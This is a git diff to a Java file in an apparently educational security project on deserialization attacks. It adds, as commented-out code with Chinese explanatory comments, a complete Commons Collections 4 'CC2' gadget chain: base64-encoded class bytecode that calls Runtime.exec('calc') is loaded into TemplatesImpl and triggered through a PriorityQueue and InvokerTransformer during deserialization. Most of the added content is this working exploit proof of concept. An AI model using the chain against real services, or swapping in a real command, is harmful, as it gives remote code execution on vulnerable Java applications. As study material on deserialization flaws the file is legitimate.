@@ -23,6 +23,8 @@ package com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollec
  *    3、在4.1中，这⼏个危险Transformer类不再实现Serializable 接⼝，也就是说，他们⼏个彻底⽆法序列化和反序列化了。
  */
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
@@ -34,6 +36,8 @@ import java.io.ByteArrayOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Comparator;
 import java.util.PriorityQueue;
 
 
@@ -41,11 +45,12 @@ import java.util.PriorityQueue;
 
 public class CommonCollections2 {
 
-    public static void main(String[] args) throws Exception{
-        CC_PriorityQueue();
-    }
+//    public static void main(String[] args) throws Exception{
+////        CC2_PriorityQueue();
+//        CC2_TemplatesImpl();
+//    }
 
-    public static void CC_PriorityQueue() throws Exception{
+    public static void CC2_PriorityQueue() throws Exception{
         Transformer[] fakeTransformers = new Transformer[]{
                 new ConstantTransformer(1)
         };
@@ -82,6 +87,13 @@ public class CommonCollections2 {
         System.out.println(o.toString());
     }
 
+    public static void CC2_TemplatesImpl() throws Exception{
+
+    }
+
+
+
+    // CC2_PriorityQueue
 //    public static void main(String[] args) throws Exception{
 //
 //        //构造恶意数组
@@ -115,8 +127,52 @@ public class CommonCollections2 {
 //    }
 
 
-
-
-
-
+    // CC2_TemplatesImpl
+//    public static void main(String[] args) throws Exception{
+//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA1jb2RlVGVzdC5qYXZhDAAHAAgHABwMAB0AHgEABGNhbGMMAB8AIAEAH2NvbS9odWF3ZWkvQ2xhc3NMb2FkZXIvY29kZVRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAALAAQADAANAA0ACwAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAARAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFQALAAAABAABAA8AAQARAAAAAgAS");
+//        TemplatesImpl obj = new TemplatesImpl();
+//        setFieldValue(obj, "_bytecodes", new byte[][]{code});
+//        setFieldValue(obj, "_name", "test");
+//        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+//
+//        //创建⼀个⼈畜⽆害的InvokerTransformer 对象，并⽤它实例化Comparator
+//        Transformer transformer = new InvokerTransformer("toString", null, null);
+//        Comparator comparator = new TransformingComparator(transformer);
+//
+//        //实例化PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要2个元素才会触发排序和⽐较，所以是2；第⼆个参数是⽐较时的Comparator，传⼊前⾯实例化的comparator
+//        PriorityQueue queue = new PriorityQueue(2,comparator);
+//
+//        //如何为了我们调试的时候避免发生命令执行，往里面加入两个无用的值。
+//        queue.add(1);
+//        queue.add(1);
+//
+//        //最后，将真正的恶意Transformer设置上
+//        setFieldValue(transformer, "iMethodName", "newTransformer");
+//
+//        //反射获取queue对象中queue的参数强转赋值给queueArray，并且修改其中的值为我们实际的TemplatesImpl对象。
+////        Field queuefield = queue.getClass().getDeclaredField("queue");
+////        queuefield.setAccessible(true);
+////        Object[] queueArray = (Object[]) queuefield.get(queue);
+////        queueArray[0] = obj;
+////        queueArray[1] = 1;
+//        setFieldValue(queue, "queue", new Object[]{obj, obj});
+//
+//
+//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+//        ObjectOutputStream oos = new ObjectOutputStream(barr);
+//        oos.writeObject(queue);
+//        oos.close();
+//        System.out.println(barr);
+//        System.out.println("-----------------------------------------------------------------------");
+//
+//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+//        Object o = (Object) ois.readObject();
+//        System.out.println(o.toString());
+//    }
+//
+//    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+//        Field field = obj.getClass().getDeclaredField(fieldName);
+//        field.setAccessible(true);
+//        field.set(obj, value);
+//    }
 }
